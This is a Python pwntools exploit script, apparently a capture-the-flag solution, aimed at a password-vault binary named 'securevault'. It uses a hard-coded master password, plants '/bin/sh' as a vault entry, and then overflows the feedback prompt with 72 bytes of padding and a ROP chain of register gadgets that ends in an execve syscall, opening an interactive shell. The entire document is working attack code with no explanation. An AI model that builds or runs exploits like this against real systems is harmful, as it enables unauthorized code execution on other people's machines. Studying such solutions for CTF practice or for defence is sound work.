#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('securevault', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x402350
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

sla(b'password: ', b'Sup3rS3cr3tM@st3r!\0 aaaaaaaaaaaa')

shell = 0x4abc6c

slna(b'Choice: ', 1)

sla(b'Entry name: ', b'/bin/sh')
sla(b'Password: ', b'aaa')

slna(b'Choice: ', 4)
slna(b'Rating (1-5): ', 1)

pop_rdi = 0x0000000000433e5d
rax = 0x0000000000434d03
rsi = 0x0000000000402081 
pop_rdx = 0x000000000046c0ca # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
syscall = 0x000000000040134d

load = flat(
    b'A'*72,
    pop_rdi,
    shell,
    rsi,
    0,
    pop_rdx,
    0,
    0,
    0,
    0,
    0,
    rax,
    0x3b,
    
    syscall,
)

sa(b'feedback: ', load)

p.interactive()
